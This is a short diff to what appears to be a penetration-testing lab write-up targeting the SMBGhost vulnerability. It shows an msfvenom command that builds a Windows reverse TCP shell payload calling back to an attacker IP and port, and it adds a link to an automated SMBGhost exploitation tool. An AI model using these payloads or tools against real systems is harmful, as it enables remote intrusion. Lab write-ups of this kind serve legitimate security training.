@@ -78,3 +78,5 @@ Listing the installed KBs, we learn that the most recently installed patch is KB
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.243 LPORT=8081 -f dll -f csharp
 ```
+
+Or use this tool https://github.com/A1vinSmith/SMBGhost_AutomateExploitation
